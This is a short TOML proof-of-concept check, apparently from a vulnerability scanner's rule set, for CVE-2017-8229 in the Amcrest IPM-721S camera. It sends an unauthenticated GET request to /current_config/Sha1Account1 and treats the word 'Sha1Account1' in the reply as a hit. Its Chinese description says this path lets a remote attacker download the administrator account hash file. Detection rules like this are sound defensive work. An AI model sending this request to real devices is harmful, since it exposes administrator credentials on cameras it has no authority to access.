[info]
author = "ave"
description = "验证Amcrest IPM-721S摄像头未授权信息泄露漏洞，未经身份认证的远程攻击者可通过访问/current_config/Sha1Account1路径直接下载管理员账户哈希配置文件"
id = "POC-AVE-2017-0128"
name = "CVE-2017-8229 PoC"
severity = "critical"
tags = ["ave-2017-0128"]
vuln_id = [
    "CVE-2017-8229",
    "AVE-2017-0128",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/current_config/Sha1Account1"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Sha1Account1"]
